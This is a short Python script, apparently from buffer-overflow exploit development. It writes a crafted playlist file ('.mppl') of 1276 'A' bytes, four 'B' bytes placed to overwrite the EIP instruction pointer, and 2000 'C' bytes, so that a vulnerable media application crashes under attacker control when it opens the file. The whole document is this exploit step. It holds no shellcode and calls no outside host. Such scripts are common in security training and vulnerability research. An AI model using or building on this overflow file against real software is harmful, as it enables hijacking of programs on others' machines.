#!/usr/bin/python

file = open("exploit_eip_b_overwrite.mppl", "wb")

buffer= "A"*1276
buffer+= "B"*4
buffer+= "C"*2000

file.write(buffer)

file.close()
